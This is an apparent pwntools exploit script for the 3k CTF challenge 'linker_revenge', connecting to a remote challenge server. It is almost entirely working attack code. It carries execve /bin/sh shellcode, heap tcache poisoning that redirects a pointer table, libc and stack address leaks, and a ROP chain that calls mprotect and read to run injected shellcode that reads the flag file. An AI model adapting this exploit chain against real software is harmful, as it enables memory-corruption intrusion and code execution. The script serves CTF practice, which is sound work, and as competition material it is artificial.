#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'
context.terminal = ['tmux','splitw','-h']

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './linker_revenge'
binary = ELF(program_name)

remote_server = 'linker-revenge.3k.ctf.to'
PORT = 9632

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

else:
    # know libc
    if args.lib:
        libc = ELF("libc6_2.27-3ubuntu1.2_amd64.so") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============ PLT =========== #

puts_PLT = 0x400920
read_PLT = 0x400980
free_PLT = 0x4008f0
seccomp_init_PLT = 0x400900
write_PLT = 0x400930
seccomp_load_PLT = 0x400940
seccomp_release_PLT = 0x400970
exit_PLT = 0x4009d0
__stack_chk_fail_PLT = 0x400950
printf_PLT = 0x400960
calloc_PLT = 0x400990
atoi_PLT = 0x4009c0
seccomp_rule_add_PLT = 0x400910
memcpy_PLT = 0x4009a0
setvbuf_PLT = 0x4009b0

# ============ GOT =========== #

_gmon_start___GOT = 0x601ff8
puts_GOT = 0x601f90
stdout_GOT = 0x602020
read_GOT = 0x601fc0
stdin_GOT = 0x602030
free_GOT = 0x601f78
seccomp_init_GOT = 0x601f80
write_GOT = 0x601f98
seccomp_load_GOT = 0x601fa0
seccomp_release_GOT = 0x601fb8
__libc_start_main_GOT = 0x601ff0
__stack_chk_fail_GOT = 0x601fa8
stderr_GOT = 0x602040
printf_GOT = 0x601fb0
calloc_GOT = 0x601fc8
exit_GOT = 0x601fe8
atoi_GOT = 0x601fe0
seccomp_rule_add_GOT = 0x601f88
memcpy_GOT = 0x601fd0
setvbuf_GOT = 0x601fd8

# ============================================================== #
# ====================== GADGETS & MAGIC ======================= #
 # ============================================================== #

pop_rdi = 0x0000000000001303 # pop rdi; ret; 
pop_rsi = 0x0000000000001301 # pop rsi; pop r15; ret; 
pop_rbp = 0x00000000000012fb # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
pop_rbp = 0x00000000000012ff # pop rbp; pop r14; pop r15; ret; 
pop_rbp = 0x0000000000000a48 # pop rbp; ret; 
pop_rbp = 0x0000000000000a88 # pop rbp; ret; 
pop_rbp = 0x0000000000000aa9 # pop rbp; ret; 
pop_rbp = 0x0000000000000c98 # pop rbp; ret; 
pop_rbp = 0x0000000000000d99 # pop rbp; ret; 
pop_rbp = 0x0000000000001298 # pop rbp; ret; 
leave = 0x0000000000000c33 # leave; ret; 
leave = 0x0000000000000d4b # leave; ret; 
leave = 0x0000000000000dee # leave; ret; 
leave = 0x0000000000000f2a # leave; ret; 
leave = 0x000000000000100a # leave; ret; 
leave = 0x00000000000010f6 # leave; ret; 
leave = 0x000000000000127e # leave; ret; 
one_gag = [ 0x4f322, 0x10a38c, 0 ] 
sys_off = 0x4f440
mal_hook_off = 0x3ebc30
free_hook_off = 0x3ed8e8

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

sl = p.sendline
sla = p.sendlineafter
sa = p.sendafter
s = p.send

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

def new(size):
    sla('>','1')
    sla('Provide page size:',str(size))

def edit(idx, data):
    sla('>','2')
    sla('Provide page index:',str(idx))
    sa('Provide new page content:',data)

def delete(idx):
    sla('>','3')
    sla('Provide page index:',str(idx))

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    sla('name size:',str(8))
    sa('Provide a name:','/flag')

    new(0x71) #0
    new(0) #1
    new(0x68) #2
    delete(2)
    edit(2,p64(0x602058))


    new(0x68) # idx2
    new(0x68) # idx3

    # atoi got = 0x000000000601fe0
    # read got = 0x000000000601fc0
    # memcpy got = 0x000000000601fd0
    edit(3,p64(0x1f1000001f1)*3 + p64(0x100000001)*4 + p64(0x0000000000601fc0) + p64(0x000000000601fd0) + p64(0x602068)*2 + p64(0x6020d0+0x30)) 

    edit(4,'/etc/passwd')

    sla('>','5')
    sla('Provide page index:\n','0')
    leak = int(hex(u64(p.recvline().strip().ljust(8,'\x00'))),16)-0x000000000110180 
    print 'LIBC=',hex(leak)

    gets = leak + 0x000000000080120 
    openat = leak + 0x000000000010ff80 
    environ = leak + 0x0000000003ee098 
    mprotect = leak + 0x00000000011bc00
    rsi = 0x0000000000401301 # pop rsi; pop r15; ret;
    rdi = 0x0000000000401303 # pop rdi; ret;
    rdx = leak + 0x00000000001665f1 # pop rax; pop rdx ; pop rbx; ret;
    syscall = leak + 0x00000000000d29d5 # syscall; ret;
    name = 0x6020d0+0x30
    print 'ENV=',hex(environ)

    # leak stack
    edit(3,p64(0x1f10000001f1)*3 + p64(0x100000001)*4 + p64(0x0000000000601fc0) + p64(environ))

    sla('>','5')
    sla('Provide page index:\n','1')
    stack = int(hex(u64(p.recvline().strip().ljust(8,'\x00'))),16)-0x100
    print 'STACK=',hex(stack)

    edit(3,p64(0x1f10000001f1)*3 + p64(0x100000001)*4 + p64(0x0000000000601fc0) + p64(stack)*2)

    name=0x602000
    payload = p64(rdi) + p64(name) + p64(rsi) + p64(0x100)*2 + p64(rdx) + p64(10) + p64(0x7)*2 + p64(syscall) # mprotect
    payload += p64(rdi) + p64(0) + p64(rsi) + p64(name)*2 + p64(rdx) + p64(0) + p64(0x100)*2 + p64(syscall) # read shellcode
    payload += p64(name) # jump into shellcode

    edit(2,payload)

    sla('>','6') # trigger ropchain

    SC= asm(
        shellcraft.openat(0, '/proc/self/cwd/flag', 0) +
        shellcraft.read('rax', 0x602700, 0x100) +
        shellcraft.write(1, 0x602700, 0x100)
    )

    p.sendline(SC)

    # ============ GDB =========== #
    p.interactive()

# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
